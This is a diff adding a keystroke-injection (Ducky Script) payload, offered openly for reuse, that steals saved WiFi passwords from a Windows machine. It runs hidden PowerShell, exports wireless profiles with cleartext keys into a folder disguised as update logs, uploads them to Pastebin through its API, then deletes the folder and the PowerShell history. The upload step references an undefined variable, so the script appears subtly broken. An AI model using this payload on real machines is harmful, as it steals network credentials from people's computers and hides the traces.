@@ -1,0 +1,56 @@
+REM A simple Pastebin WiFi exfiltration script.
+REM Could probably use some more optimization, but that of course depends on your target machine.
+REM Don't care if you credit me or not, and be sure to modify to your heart's content!
+REM By ATotallyRandomGuy
+
+LED 0 0 0
+DELAY 1000
+GUI r
+DELAY 300
+
+REM open powershell, hidden (-windowstyle hidden)
+STRING powershell.exe -w h
+ENTER
+DELAY 500
+
+REM create temp folder for storing the exported .xml files
+STRING New-Item -ItemType "directory" -Path "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\"
+ENTER
+DELAY 100
+STRING cd "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\"
+ENTER
+DELAY 100
+
+REM export WiFi details
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 300
+
+REM extract useful loot to single .txt for exfiltration
+STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > wifi_details.txt
+ENTER
+DELAY 100
+
+REM calling on Pastebin API to upload loot (Be sure to put your api dev key and user key in here!)
+STRING $variable = '$Body = @{ api_dev_key = 'your pastebin api dev key goes here';api_paste_code = ("$extract");api_paste_private = 2;api_paste_expire_date = '10M';api_paste_name = "New WiFi Details";api_option = 'paste';api_user_key = 'your pastebin api user key here'};Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post'
+ENTER
+STRING Invoke-Expression $variable
+ENTER
+STRING cd C:\
+ENTER
+
+REM delete temp folder
+STRING Remove-Item "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\"
+ENTER
+DELAY 400
+STRING y
+ENTER
+DELAY 200
+
+REM delete powershell history and exit
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
+ENTER
+DELAY 100
+STRING exit
+ENTER
+LED 0 255 0
